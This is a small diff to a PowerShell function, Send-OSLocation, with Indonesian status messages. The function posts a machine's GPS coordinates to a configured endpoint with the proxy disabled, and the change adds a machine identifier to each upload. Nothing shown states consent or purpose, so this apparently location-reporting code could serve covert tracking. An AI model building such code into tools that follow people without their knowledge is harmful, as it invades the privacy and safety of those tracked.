@@ -232,7 +232,7 @@ function Send-OSLocation {
         $wc.Proxy = $null
         $wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
         $payload = @{ lat = $loc.lat; lon = $loc.lon; accuracy = $loc.accuracy } | ConvertTo-Json -Compress
-        $resp = $wc.UploadString($Endpoint, "type=gps&data=" + [uri]::EscapeDataString($payload))
+        $resp = $wc.UploadString($Endpoint, "type=gps&machine=" + [uri]::EscapeDataString($MachineID) + "&data=" + [uri]::EscapeDataString($payload))
         Write-Host "[+] GPS OS terkirim: $($loc.lat), $($loc.lon) (akurasi $($loc.accuracy) m) - $resp"
     } catch {
         Write-Host "[!] Gagal kirim GPS: $($_.Exception.Message)"
